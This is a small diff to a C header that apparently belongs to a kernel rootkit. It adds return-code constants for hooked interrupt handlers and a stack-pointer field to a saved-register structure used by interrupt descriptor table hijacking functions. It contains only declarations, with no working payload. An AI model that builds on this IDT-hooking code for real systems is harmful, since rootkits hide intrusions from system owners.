@@ -6,6 +6,10 @@ enum idt_hijack_method {
     IDT_ENTRY = 2,
 };
 
+#define IRET 0              //return from the handler
+#define IRET_ORIG 1         //execute the original handler
+#define IRET_ORIG_POST -1   //execute the original handler and the post hook
+
 void idt_substitute(enum idt_hijack_method m);
 void idt_restore(void);
 
@@ -14,6 +18,7 @@ void idt_hook_enable(int entry);
 void idt_hook_disable(int entry);
 
 struct slrk_regs {
+    unsigned long rsp;
     unsigned long r15;
     unsigned long r14;
     unsigned long r13;
